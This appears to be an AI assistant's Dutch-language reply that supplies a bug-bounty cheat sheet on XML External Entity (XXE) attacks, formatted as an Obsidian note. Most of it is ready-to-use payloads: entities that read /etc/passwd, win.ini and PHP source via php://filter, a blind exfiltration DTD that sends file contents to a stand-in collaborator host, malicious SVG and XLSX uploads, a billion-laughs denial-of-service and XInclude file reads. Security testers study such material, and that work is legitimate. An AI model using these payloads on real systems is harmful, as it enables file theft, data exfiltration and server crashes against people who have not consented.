Dit is de perfecte opvolger van SSRF. **XXE** ontstaat vaak op dezelfde plekken (waar de server externe data verwerkt), maar de exploitatie is specifiek gericht op de **XML parser**.

Het is een zeer technische bug die vaak leidt tot **P1/P2 (High/Critical)** omdat je lokale bestanden (LFI) kunt lezen.

Hier is de complete Obsidian notitie voor **XML External Entity (XXE)**.

---

Markdown

````
# 📄 XML External Entity (XXE)

==Concept: Misbruik van een onveilige XML-configuratie om lokale bestanden te lezen (`/etc/passwd`), SSRF uit te voeren of de server te crashen (DoS).==



---

## 🕵️‍♂️ 1. Detection (Waar zit XML?)
*Soms is het duidelijk (`Content-Type: application/xml`), maar vaak zit het verstopt.*

### Content-Type Spoofing (De "JSON Trick")
Veel moderne apps gebruiken JSON. Maar soms ondersteunt de backend óók XML als je de header aanpast.

**Origineel Request:**
```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"user": "admin"}
````

**Jouw Test:** Verander de Content-Type naar `application/xml` en stuur XML data.

HTTP

```
POST /api/login HTTP/1.1
Content-Type: application/xml

<user>admin</user>
```

_Krijg je een normale error of response? -> De server parset XML! -> **Potentieel XXE.**_

### Hidden XML Files

Bestanden die eigenlijk ingepakte XML's zijn:

- **SVG Images** (Vector plaatjes zijn pure XML).
    
- **Office documenten** (`.docx`, `.xlsx`, `.pptx`).
    
- **SOAP APIs** (Oude Enterprise API's).
    
- **SAML** (Authenticatie tokens).
    

---

## 📂 2. Basic Exploitation (File Read)

_Als de applicatie de output van de XML teruggeeft op het scherm (Reflected XXE)._

**Standaard Payload (`/etc/passwd`):** Voeg een `DOCTYPE` met een `ENTITY` toe bovenin het request. Roep de entity aan in een data-veld.

XML

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
]>
<root>
  <name>&xxe;</name>
  <email>test@test.com</email>
</root>
```

**Windows Payload (`win.ini`):**

XML

```
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
```

---

## 🦇 3. Blind XXE (OOB Exfiltration)

_De applicatie verwerkt de XML, maar laat de inhoud van het bestand NIET zien op het scherm. Je moet de data naar je eigen server sturen (net als bij Blind SSRF)._

**Vereiste:** Burp Collaborator of Interactsh.

### Methode 1: Parameter Entities (De standaard)

Je hebt een externe DTD nodig die je host op jouw server.

**Stap 1: Maak `evil.dtd` op jouw server**

XML

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '[http://jouw-collaborator.com/?x=%file](http://jouw-collaborator.com/?x=%file);'>">
%eval;
%exfiltrate;
```

**Stap 2: Stuur de XML payload naar target**

XML

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
  <!ENTITY % xxe SYSTEM "[http://jouw-server.com/evil.dtd](http://jouw-server.com/evil.dtd)"> 
  %xxe;
]>
<root>test</root>
```

_De server laadt `evil.dtd`, leest `/etc/passwd` en stuurt de inhoud als parameter naar jouw collaborator._

---

## 🔮 4. PHP Wrappers (Base64 Encoding)

_Als het bestand speciale tekens bevat (zoals XML tags in een config file), breekt de parser. Gebruik Base64 om het veilig te lezen._

**Payload:**

XML

```
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

_De output is een Base64 string. Decode deze in Burp (`Ctrl+Shift+B`) om de broncode te lezen._

---

## 🖼️ 5. Special Files (SVG & Excel)

_De leukste manier om XXE te vinden via file uploads._

### SVG XXE (Image Upload)

Sla dit op als `exploit.svg` en upload het als profielfoto.

XML

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

_Als de server een preview maakt, zie je de inhoud van `/etc/passwd` in het plaatje._

### Excel XXE (Office Documenten)

Een `.xlsx` bestand is gewoon een ZIP met XML files.

1. Maak een leeg Excel bestand.
    
2. Unzip het: `unzip map.xlsx`.
    
3. Bewerk `xl/workbook.xml` (of `sharedStrings.xml`).
    
4. Voeg de XXE payload toe (DOCTYPE + Entity).
    
5. Zip het weer: `zip -r exploit.xlsx *`.
    
6. Upload het bestand.
    

---

## 💣 6. Billion Laughs Attack (DoS)

_Waarschuwing: Dit crasht de server door geheugen vol te laten lopen. Doe dit alleen als het expliciet mag, anders word je gebanned._

Het doel is om geneste entities exponentieel te laten groeien. `lol1` = "lol" `lol2` = 10x `lol1` `lol3` = 10x `lol2` ... `lol9` = 10x `lol8` (Dit zijn miljoenen regels -> Server Crash).

XML

```
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
...
]>
<data>&a3;</data>
```

---

## 📝 Checklist XXE

- [ ] **Content-Type:** Heb ik geprobeerd `application/json` te veranderen naar `application/xml`?
    
- [ ] **Uploads:** Accepteert de site SVG, DOCX of XLSX?
    
- [ ] **Blind:** Heb ik een externe DTD geprobeerd met een Collaborator link?
    
- [ ] **Wrappers:** Heb ik `php://filter` geprobeerd voor PHP targets?
    
- [ ] **XInclude:** Werkt standaard XXE niet? Probeer `XInclude` (een andere XML feature):
    
    XML
    
    ```
    <foo xmlns:xi="[http://www.w3.org/2001/XInclude](http://www.w3.org/2001/XInclude)">
    <xi:include parse="text" href="file:///etc/passwd"/></foo>
    ```